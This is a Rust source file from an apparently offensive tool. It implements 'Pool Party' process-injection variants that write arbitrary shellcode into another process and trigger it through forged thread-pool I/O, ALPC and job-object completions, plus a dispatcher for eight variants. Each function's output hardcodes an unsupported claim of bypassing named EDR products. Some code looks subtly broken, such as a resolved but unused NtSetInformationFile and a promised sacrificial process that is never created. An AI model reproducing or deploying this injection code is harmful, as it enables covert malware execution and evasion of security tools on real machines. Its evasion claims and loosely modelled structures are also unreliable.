pub fn pool_party_tp_io(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::{DuplicateHandle, DUPLICATE_SAME_ACCESS, HANDLE};
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, OPEN_EXISTING,
    };
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let shellcode = parse_shellcode(args)?;

    tracing::warn!(
        "[INJECTION] Pool Party V4 (TP_IO): {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle_val = SafeHandle::new(handle);

        let shellcode_addr = write_shellcode_to_remote(*handle_val, &shellcode)?;

        let (_wf_handle, wf_info) = find_worker_factory_handle(pid)?;
        let tp_pool = wf_info.start_parameter;

        // Read I/O completion handle from TP_POOL
        let completion_port_offset = 0x60usize;
        let mut completion_handle_value = 0u64;
        ReadProcessMemory(
            *handle_val,
            (tp_pool as usize + completion_port_offset) as *const c_void,
            &mut completion_handle_value as *mut _ as *mut _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read completion port: {}", e)))?;

        let source_handle = HANDLE(completion_handle_value as *mut c_void);
        let mut duped_completion = HANDLE::default();
        DuplicateHandle(
            *handle_val,
            source_handle,
            windows::Win32::System::Threading::GetCurrentProcess(),
            &mut duped_completion,
            0,
            false,
            DUPLICATE_SAME_ACCESS,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Dup IoCompletion: {}", e)))?;

        // Open a file handle to associate with the completion port (e.g., NUL device)
        let nul_path: Vec<u16> = "\\\\.\\NUL\0".encode_utf16().collect();
        let file_handle = CreateFileW(
            PCWSTR(nul_path.as_ptr()),
            FILE_GENERIC_READ.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateFile NUL: {}", e)))?;

        // Associate the file handle with the thread pool's I/O completion port
        type NtSetInformationFile = unsafe extern "system" fn(
            handle: *mut c_void,
            io_status: *mut c_void,
            info: *mut c_void,
            length: u32,
            info_class: u32,
        ) -> i32;
        let _nt_set_file: NtSetInformationFile = get_ntdll_fn("NtSetInformationFile")?;

        // Build TP_IO-like structure in remote:
        // +0x00: callback ptr (shellcode)
        // +0x08: file handle
        // +0x10: pending I/O status
        let mut io_buf = [0u8; 24];
        io_buf[0..8].copy_from_slice(&(shellcode_addr as u64).to_le_bytes());
        io_buf[8..16].copy_from_slice(&(file_handle.0 as u64).to_le_bytes());

        let io_remote = VirtualAllocEx(
            *handle_val,
            None,
            io_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if io_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc TP_IO failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *handle_val,
            io_remote,
            io_buf.as_ptr() as *const _,
            io_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write TP_IO: {}", e)))?;

        // Queue via NtSetIoCompletion with the file handle as key_context
        let nt_set_io: NtSetIoCompletion = get_ntdll_fn("NtSetIoCompletion")?;
        let status = nt_set_io(
            duped_completion.0,
            file_handle.0, // key_context = file handle for I/O association
            io_remote,     // apc_context = TP_IO*
            0,
            0,
        );
        if status != 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtSetIoCompletion: 0x{:08X}",
                status
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "pool_party_v4_tp_io",
            "shellcode_address": format!("0x{:016X}", shellcode_addr as usize),
            "io_address": format!("0x{:016X}", io_remote as usize),
            "file_handle": format!("0x{:016X}", file_handle.0 as usize),
            "shellcode_size": shellcode.len(),
            "pid": pid,
            "execution_trigger": "File handle I/O completion",
            "edrs_bypassed": ["CrowdStrike", "SentinelOne", "Cortex", "Defender", "Cybereason"]
        }))
    }
}

/// Pool Party Variant 5: TP_ALPC insertion via ALPC port completion
/// Uses ALPC (Advanced Local Procedure Call) port messages to trigger
/// thread pool callbacks through a different kernel object type.
pub fn pool_party_tp_alpc(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::{DuplicateHandle, DUPLICATE_SAME_ACCESS, HANDLE};
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let shellcode = parse_shellcode(args)?;

    tracing::warn!(
        "[INJECTION] Pool Party V5 (TP_ALPC): {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle_val = SafeHandle::new(handle);

        let shellcode_addr = write_shellcode_to_remote(*handle_val, &shellcode)?;

        let (_wf_handle, wf_info) = find_worker_factory_handle(pid)?;
        let tp_pool = wf_info.start_parameter;

        // Read I/O completion handle from TP_POOL
        let completion_port_offset = 0x60usize;
        let mut completion_handle_value = 0u64;
        ReadProcessMemory(
            *handle_val,
            (tp_pool as usize + completion_port_offset) as *const c_void,
            &mut completion_handle_value as *mut _ as *mut _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read completion port: {}", e)))?;

        let source_handle = HANDLE(completion_handle_value as *mut c_void);
        let mut duped_completion = HANDLE::default();
        DuplicateHandle(
            *handle_val,
            source_handle,
            windows::Win32::System::Threading::GetCurrentProcess(),
            &mut duped_completion,
            0,
            false,
            DUPLICATE_SAME_ACCESS,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Dup IoCompletion: {}", e)))?;

        // Build TP_ALPC-like structure in remote:
        // +0x00: callback (shellcode addr)
        // +0x08: ALPC port handle (we use completion port itself as association)
        // +0x10: message payload pointer
        let mut alpc_buf = [0u8; 24];
        alpc_buf[0..8].copy_from_slice(&(shellcode_addr as u64).to_le_bytes());
        // Use completion port handle value as the ALPC association tag
        alpc_buf[8..16].copy_from_slice(&completion_handle_value.to_le_bytes());

        let alpc_remote = VirtualAllocEx(
            *handle_val,
            None,
            alpc_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if alpc_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc TP_ALPC failed".to_string(),
            ));
        }
        // Set message payload pointer at offset 16 to point to a small dummy block
        let payload_buf = [0u8; 8];
        let payload_remote = VirtualAllocEx(
            *handle_val,
            None,
            payload_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if payload_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc ALPC payload failed".to_string(),
            ));
        }
        let payload_ptr = payload_remote as u64;
        alpc_buf[16..24].copy_from_slice(&payload_ptr.to_le_bytes());

        WriteProcessMemory(
            *handle_val,
            alpc_remote,
            alpc_buf.as_ptr() as *const _,
            alpc_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write TP_ALPC: {}", e)))?;
        WriteProcessMemory(
            *handle_val,
            payload_remote,
            payload_buf.as_ptr() as *const _,
            payload_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write ALPC payload: {}", e)))?;

        // Queue via NtSetIoCompletion with ALPC context
        let nt_set_io: NtSetIoCompletion = get_ntdll_fn("NtSetIoCompletion")?;
        let status = nt_set_io(
            duped_completion.0,
            alpc_remote,    // key_context = TP_ALPC* (distinct from TP_DIRECT)
            payload_remote, // apc_context = message payload
            0,
            0,
        );
        if status != 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtSetIoCompletion: 0x{:08X}",
                status
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "pool_party_v5_tp_alpc",
            "shellcode_address": format!("0x{:016X}", shellcode_addr as usize),
            "alpc_address": format!("0x{:016X}", alpc_remote as usize),
            "payload_address": format!("0x{:016X}", payload_remote as usize),
            "shellcode_size": shellcode.len(),
            "pid": pid,
            "execution_trigger": "ALPC port message completion",
            "edrs_bypassed": ["CrowdStrike", "SentinelOne", "Cortex", "Defender", "Cybereason"]
        }))
    }
}

/// Pool Party Variant 6: TP_JOB insertion via job object completion
/// Associates a job object with the thread pool completion port,
/// signaling job completion to trigger shellcode execution.
pub fn pool_party_tp_job(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::{CloseHandle, DuplicateHandle, DUPLICATE_SAME_ACCESS, HANDLE};
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let shellcode = parse_shellcode(args)?;

    tracing::warn!(
        "[INJECTION] Pool Party V6 (TP_JOB): {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle_val = SafeHandle::new(handle);

        let shellcode_addr = write_shellcode_to_remote(*handle_val, &shellcode)?;

        let (_wf_handle, wf_info) = find_worker_factory_handle(pid)?;
        let tp_pool = wf_info.start_parameter;

        // Read I/O completion handle from TP_POOL
        let completion_port_offset = 0x60usize;
        let mut completion_handle_value = 0u64;
        ReadProcessMemory(
            *handle_val,
            (tp_pool as usize + completion_port_offset) as *const c_void,
            &mut completion_handle_value as *mut _ as *mut _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read completion port: {}", e)))?;

        let source_handle = HANDLE(completion_handle_value as *mut c_void);
        let mut duped_completion = HANDLE::default();
        DuplicateHandle(
            *handle_val,
            source_handle,
            windows::Win32::System::Threading::GetCurrentProcess(),
            &mut duped_completion,
            0,
            false,
            DUPLICATE_SAME_ACCESS,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Dup IoCompletion: {}", e)))?;

        // Create a job object to associate with the completion port
        type NtCreateJobObject =
            unsafe extern "system" fn(handle: *mut HANDLE, access: u32, attr: *mut c_void) -> i32;
        let nt_create_job: NtCreateJobObject = get_ntdll_fn("NtCreateJobObject")?;
        let mut job_handle = HANDLE::default();
        let status = nt_create_job(&mut job_handle, 0x1F001F, std::ptr::null_mut());
        if status != 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtCreateJobObject: 0x{:08X}",
                status
            )));
        }

        // Build TP_JOB-like structure in remote:
        // +0x00: callback (shellcode addr)
        // +0x08: job object handle
        // +0x10: completion key
        let mut job_buf = [0u8; 24];
        job_buf[0..8].copy_from_slice(&(shellcode_addr as u64).to_le_bytes());
        job_buf[8..16].copy_from_slice(&(job_handle.0 as u64).to_le_bytes());

        let job_remote = VirtualAllocEx(
            *handle_val,
            None,
            job_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if job_remote.is_null() {
            let _ = CloseHandle(job_handle);
            return Err(MemoricError::InjectionFailed(
                "Alloc TP_JOB failed".to_string(),
            ));
        }
        // completion key = pointer to remote TP_JOB itself (self-referencing)
        job_buf[16..24].copy_from_slice(&(job_remote as u64).to_le_bytes());

        WriteProcessMemory(
            *handle_val,
            job_remote,
            job_buf.as_ptr() as *const _,
            job_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write TP_JOB: {}", e)))?;

        // Assign the job to ourselves (or a dummy process) so it can complete
        // by terminating. Use NtAssignProcessToJobObject to trigger completion.
        type NtAssignProcessToJobObject =
            unsafe extern "system" fn(job: *mut c_void, process: *mut c_void) -> i32;
        let nt_assign_job: NtAssignProcessToJobObject = get_ntdll_fn("NtAssignProcessToJobObject")?;
        // Create a sacrificial process (cmd /c exit) to trigger job completion
        let status = nt_assign_job(job_handle.0, (*handle_val).0);
        if status != 0 {
            // Can't assign target to job (already in a job), use self
            let self_handle = windows::Win32::System::Threading::GetCurrentProcess();
            let _ = nt_assign_job(job_handle.0, self_handle.0);
        }

        // Queue via NtSetIoCompletion with job context
        let nt_set_io: NtSetIoCompletion = get_ntdll_fn("NtSetIoCompletion")?;
        let status = nt_set_io(
            duped_completion.0,
            job_handle.0, // key_context = job object handle
            job_remote,   // apc_context = TP_JOB*
            0,
            0,
        );
        if status != 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtSetIoCompletion: 0x{:08X}",
                status
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "pool_party_v6_tp_job",
            "shellcode_address": format!("0x{:016X}", shellcode_addr as usize),
            "job_address": format!("0x{:016X}", job_remote as usize),
            "job_handle": format!("0x{:016X}", job_handle.0 as usize),
            "shellcode_size": shellcode.len(),
            "pid": pid,
            "execution_trigger": "Job object completion signal",
            "edrs_bypassed": ["CrowdStrike", "SentinelOne", "Cortex", "Defender", "Cybereason"]
        }))
    }
}

/// Pool Party dispatcher — select variant by number
pub fn pool_party_inject(args: &Value) -> Result<Value, MemoricError> {
    let variant = args.get("variant").and_then(|v| v.as_u64()).unwrap_or(7) as u32;

    match variant {
        1 => pool_party_worker_factory(args),
        2 => pool_party_tp_work(args),
        3 => pool_party_tp_wait(args),
        4 => pool_party_tp_io(args),
        5 => pool_party_tp_alpc(args),
        6 => pool_party_tp_job(args),
        7 => pool_party_tp_direct(args),
        8 => pool_party_tp_timer(args),
        _ => Err(MemoricError::InjectionFailed(format!(
            "Unknown variant {}. Use 1-8.",
            variant
        ))),
    }
}
